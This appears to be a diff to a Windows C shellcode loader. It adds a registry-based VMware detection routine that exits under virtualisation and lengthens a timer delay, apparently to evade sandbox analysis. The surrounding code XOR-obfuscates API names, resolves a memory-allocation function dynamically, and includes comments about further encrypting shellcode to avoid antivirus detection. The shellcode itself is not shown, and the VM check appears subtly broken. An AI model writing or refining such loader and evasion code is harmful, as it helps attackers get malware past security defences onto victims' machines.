@@ -6,6 +6,7 @@
 VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime);
 LPVOID (WINAPI * pAllocate) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key);
+BOOL CheckRegisteryKey();
 
 typedef struct 
 {
@@ -21,6 +22,8 @@ TimerContext g_context;
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
+	// Implement this function with further virtualisation checks 
+	CheckRegisteryKey();
 	FreeConsole();
 	unsigned char key = 's';
 	// Further encrypt this shellcode (see if AV still identifies its as a )
@@ -40,7 +43,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	pAllocate = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(de_xor(kernel, sizeof(kernel), key)), de_xor(procName, sizeof(procName), key));
 
 
-	UINT_PTR timerId = SetTimer(NULL, 1, 1, TimerProc);
+	UINT_PTR timerId = SetTimer(NULL, 1, 60000, TimerProc);
 
 	MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -84,6 +87,24 @@ LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key)
 		payload[i] = payload[i]^key;
 	}
 	return (LPCSTR)payload;
+}
+
+BOOL CheckRegisteryKey()
+{
+	// Obfuscate the function calls that check register keys 
+	HKEY regHandle = NULL;
+	
+	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 0, KEY_READ, &regHandle) == ERROR_SUCCESS)
+	{
+		if (RegQueryValueExW(regHandle, (LPCWSTR)"VMware SCSI Controller", NULL, NULL, NULL, NULL))
+		{
+			exit(1);
+			return TRUE;
+		}
+	}
+	// Closes the handle to the specified registery key (used because the key (sub key) is not a predefined window reg key that is kept open all the time)
+	RegCloseKey(regHandle);
+	return FALSE;
 }
 
 
